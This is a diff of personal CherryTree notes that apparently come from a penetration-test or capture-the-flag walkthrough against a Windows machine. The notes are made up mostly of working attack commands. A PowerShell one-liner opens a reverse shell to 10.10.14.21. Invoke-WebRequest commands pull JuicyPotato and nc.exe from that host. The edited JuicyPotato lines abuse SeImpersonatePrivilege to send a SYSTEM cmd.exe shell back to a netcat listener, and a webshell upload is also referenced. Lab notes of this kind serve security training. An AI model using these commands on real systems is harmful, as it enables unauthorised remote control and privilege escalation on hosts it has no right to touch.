@@ -554,7 +554,7 @@ local: webshell-asp.asp remote: webshell-asp.asp
           <codebox char_offset="824" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  </codebox>
         </node>
       </node>
-      <node name="privEsc" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707003046" ts_lastsave="1707007878">
+      <node name="privEsc" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707003046" ts_lastsave="1707007623">
         <rich_text>fiirst lets copy winpeas via
 
 
@@ -597,6 +597,9 @@ then do the priv esc
         <rich_text>
 
 
+or
+
+
 
 make sure u start the listener
 
@@ -606,8 +609,9 @@ make sure u start the listener
         <codebox char_offset="145" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">SeImpersonatePrivilege </codebox>
         <codebox char_offset="175" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest -Uri 'http://10.10.14.21/juicypotato.exe' -OutFile 'juice.exe'</codebox>
         <codebox char_offset="213" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest -Uri 'http://10.10.14.21/nc.exe' -OutFile 'nc.exe'</codebox>
-        <codebox char_offset="238" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./juice.exe -l 1234 -p C:\Users\Destitute\Desktop\nc.exe -a "-e c:\Windows\System32\cmd.exe 10.10.14.21 443" -t *</codebox>
-        <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nc -vlp  1337</codebox>
+        <codebox char_offset="238" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./juice.exe -l 1234 -p C:\Users\Destitute\Desktop\nc.exe -a "-e c:\Windows\System32\cmd.exe 10.10.14.21 1337" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}</codebox>
+        <codebox char_offset="246" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./juice.exe -l 1234 -p c:\Windows\System32\cmd.exe -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}</codebox>
+        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nc -vlp  1337</codebox>
         <node name="winpeas output" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707003951" ts_lastsave="1707003952">
           <rich_text>
 ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
